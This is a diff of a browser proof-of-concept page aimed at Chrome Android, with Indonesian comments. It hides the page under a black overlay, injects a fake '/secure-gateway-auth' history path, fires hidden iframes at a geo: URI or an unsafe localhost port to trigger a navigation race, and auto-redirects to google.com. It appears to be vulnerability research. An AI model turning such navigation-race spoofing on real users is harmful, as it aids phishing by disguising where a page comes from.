@@ -3,19 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced PoC - Chrome Android Auto-Redirect</title>
+    <title>Advanced PoC - Invalid Port Stable Race</title>
     <style>
         body, html {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
-            background-color: #000000; /* Black Portal background */
+            background-color: #000000;
             color: #00ff66;
             font-family: monospace;
             overflow: hidden;
         }
-        /* Blackout Portal / Blank Portal Layer untuk mengunci render viewport */
         #blackout-portal {
             position: fixed;
             top: 0;
@@ -28,7 +27,6 @@
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            transition: opacity 0.4s ease-in-out;
         }
         .console {
             border: 1px solid #00ff66;
@@ -56,12 +54,11 @@
 </head>
 <body>
 
-    <!-- Blackout Portal Layer (Menutupi DOM asli untuk memaksimalkan manipulasi render) -->
     <div id="blackout-portal">
         <div class="console">
-            <h3>[!] Chrome Android Auto-Redirect Engine</h3>
+            <h3>[!] Invalid Port Race Engine</h3>
             <div id="status-container">
-                <div class="log-line">> Menginisialisasi auto-redirect buffer...</div>
+                <div class="log-line">> Menginisialisasi port-blocking buffer...</div>
             </div>
         </div>
     </div>
@@ -76,38 +73,29 @@
             statusContainer.appendChild(div);
         }
 
-        // Eksekusi Zero-Click Instan khusus Chrome Android
         try {
-            // 1. Injeksi History State untuk mengontrol alur riwayat browser
-            history.pushState({auto: true}, "", "/secure-gateway-auth");
+            // 1. Injeksi State Navigasi
+            history.pushState({race: true}, "", "/secure-gateway-auth");
             addLog("History state disuntikkan: <span class='highlight'>/secure-gateway-auth</span>");
 
-            // 2. Navigation Race Condition khusus perangkat seluler (Chrome Android)
-            const raceVectors = [
-                "geo:0,0?q=auto_redirect",
-                "about:blank"
-            ];
+            // 2. Invalid Port Vector: Menggunakan port terlarang/tidak valid (misal port 1) 
+            // untuk memicu ERR_UNSAFE_PORT atau koneksi gagal instan tanpa indikator "Loading..." yang lama.
+            const invalidPortVector = "http://127.0.0.1:1/nonexistent";
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = invalidPortVector;
+            document.body.appendChild(iframe);
+            addLog("Invalid port target dilepaskan: <span class='highlight'>Port 1 (Unsafe/Blocked)</span>");
 
-            raceVectors.forEach((uri, index) => {
-                setTimeout(() => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = uri;
-                    document.body.appendChild(iframe);
-                    addLog(`Race vector [${index + 1}] dilepaskan.`);
-                }, index * 25); // Interval rapat untuk memicu kondisi asinkron di Chrome mobile
-            });
-
-            // 3. Auto-Redirect tanpa ditekan ke Google.com
-            // Menggunakan window.location.replace agar proses pengalihan berjalan otomatis seketika
+            // 3. Stable Instant Redirect tanpa jeda loading yang menggantung
             setTimeout(() => {
-                addLog("Memicu redirect otomatis ke Google.com...");
+                addLog("Memicu redirect stabil ke Google.com...");
                 window.location.replace("https://www.google.com");
-            }, 500); // Eksekusi otomatis dalam 500ms setelah halaman dimuat
+            }, 150); // Eksekusi sangat cepat untuk memotong siklus render loader
 
         } catch (err) {
             addLog(`Kesalahan Eksekusi: ${err.message}`);
-            // Fallback langsung jika terjadi blokir
             window.location.href = "https://www.google.com";
         }
     </script>
